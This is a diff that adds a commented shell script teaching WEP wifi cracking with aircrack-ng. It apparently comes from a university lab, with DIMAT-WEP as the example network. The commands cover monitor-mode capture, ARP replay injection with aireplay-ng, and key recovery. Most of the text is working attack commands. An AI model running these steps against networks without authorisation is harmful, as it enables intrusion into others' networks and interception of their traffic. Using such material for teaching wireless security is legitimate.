@@ -1,0 +1,61 @@
+# Here are listed the steps needed to do the cracking of a wifi network 
+# protected by WEP key using the tools aircrack suite, and in particular: 
+# airodump: for the capture of 802.11 packets (sniffer) 
+# aireplay: for packet injection 
+# aircrack: cracking WEP keys
+
+
+# become administrator
+sudo su
+
+#disable the network-manager
+/etc/init.d/network-manager stop
+
+# create a virtual network interface (associated with the wireless card) preset
+#in monitor mode. Might need to disable the network card to go in monitor mode
+
+iw dev wlan0 interface add wlan0mon type monitor
+
+#to enter monitor mode on any interface, but this will prevent normal operations:
+(ifconfig nomewlan0 down; iwconfig nomewlan0 mode monitor)
+
+#see what are the WEP networks near and the corresponding channel
+airodump-ng wlan0mon
+
+#in our case, we assume the network to be cracked is called DIMAT-WEP, and work on channel 2, so we restart focussing on this #channel
+airodump-ng -c 2 -w capture_file wlan0mon
+
+#in another terminal run the following command to repeat the
+#sub-command every 2 seconds
+#(This command is used to check if the file capture_file.cap grows)
+watch ls -l
+
+#run aircrack-ng command
+#aircrack interactively prompts you to choose a BSSID, choose the BSSID
+#corresponding to DIMAT-WEP and
+#let aircrack analyze encrypted data in search of the key
+aircrack-ng capture_file.cap
+
+#aircrack will most likely ask you to try a more IV ..
+#To speed up this process we can stimulate sending data.
+#How? For example, we can intercept a frame and try to resend it:
+#If it's a ping, you'll see an encrypted reply 
+#similarly if you can sniff an ARP packet: there will be a replay that you can capture.
+#Note that the replies will always be originated with different IVs!
+
+#If you want to use ARP packets the idea is to identify an ARP frame and replay it at will
+#Therefore, in another terminal try to execute the command
+#aireplay-ng that allows to repeat the various types of frames intercepted
+#(the option -3, for example, identifies the ARP packets, the option -b is used to define the BSSID on which
+#you want work - you can see the screen of airodump  -)
+aireplay-ng -3 wlan0mon -b MAC_BSSID_ADDRESS
+
+#At this point we need to find a MAC address of a station that
+#is already mapped, if we are not mapped.
+#We will need the MAC address for the ARP false replies to be sent.
+#We can use wireshark to find or locate a valid address
+#in the second part of the screen of airodump
+aireplay-ng -3 wlan0mon -b MAC_BSSID_ADDRESS -h MAC_SOURCE_FOR_REPLIES
+
+#If successful, you should notice many more IVs with which to make cryptographic analysis
+#and consequently aircrack should pop out the right password quickly! :)
